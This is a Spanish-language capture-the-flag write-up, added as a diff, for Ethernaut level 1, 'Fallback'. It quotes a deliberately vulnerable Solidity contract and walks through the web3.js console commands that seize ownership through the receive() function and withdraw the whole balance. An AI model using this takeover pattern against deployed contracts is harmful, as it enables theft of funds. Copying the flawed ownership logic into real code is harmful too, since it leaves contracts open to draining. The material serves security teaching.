@@ -1,0 +1,114 @@
+# Level 1: Fallback
+
+Este es el nivel 1 del juego [Ethernaut](https://ethernaut.openzeppelin.com/).
+
+## requisitos previos
+
+- Envío de transacciones usando [web3.js](https://ethereum.stackexchange.com/questions/53094/sending-ether-via-contract-instance) a un contrato y a una función de pago 
+- [Conversion between units ether & wei](https://web3js.readthedocs.io/en/v1.5.2/web3-utils.html#towei)
+- función Solidity contract [fallback](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) 
+
+## Atajos
+
+contrato dado:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+
+  mapping(address => uint) public contributions;
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            "caller is not the owner"
+        );
+        _;
+    }
+
+  function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    payable(owner).transfer(address(this).balance);
+  }
+
+  receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+  }
+}
+```
+el método `contract` métodos y `web3.js` pueden ser ejecutadas desde la consola
+
+El `player` address, debemos convertirla en `owner` del contrato y luego retirar todo el monto del contrato.
+
+las partes claves son: la funcion `contribute` y la funcion `receive`.
+
+En el constructor, se observa que el  `owner`' la contribución es de 1000 eth. Una forma de convertirse en `owner` es enviar del `owner`' una contribución eth desde la función `contribute`. verificamos la contribución del `owner` eth desde la consola:
+
+```javascript
+ownerAddr = await contract.owner();
+await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008').then(v => v.toString())
+
+// Output '1000000000000000000000'
+```
+¡Pero eso sería demasiado eth! No tenemos nada cerca.
+
+Sin embargo, eche un vistazo a la función `receive`. También tiene código para cambiar de dueño. Según el código, podemos reclamar la propiedad si:
+
+- El contrato tiene una contribución distinta de cero por nuestra parte (`player`).
+
+- Luego, enviamos al contrato una cantidad eth distinta de cero.
+
+`player` la dirección tiene una contribución cero al contrato actualmente, así que satisfagamos la primera condición enviando **menos de 0.001** eth (requerido según el código):
+
+```javascript
+await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
+```
+
+Ahora tenemos una contribución distinta de cero que puede verificar mediante:
+
+```javascript
+await contract.getContribution().then(v => v.toString())
+```
+
+Y ahora envíe cualquier cantidad de éter distinta de cero al contrato:
+
+```javascript
+await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
+```
+
+Boom! ¡Reclamamos la propiedad del contrato!
+Puede verificar que `owner` es la misma dirección que `player` por:
+
+```javascript
+await contract.owner()
+// Output: Same as player address
+```
+
+Y para el golpe final, retirar todo el saldo del contrato:
+
+```javascript
+await contract.withdraw()
+```
+
+Hecho.
+
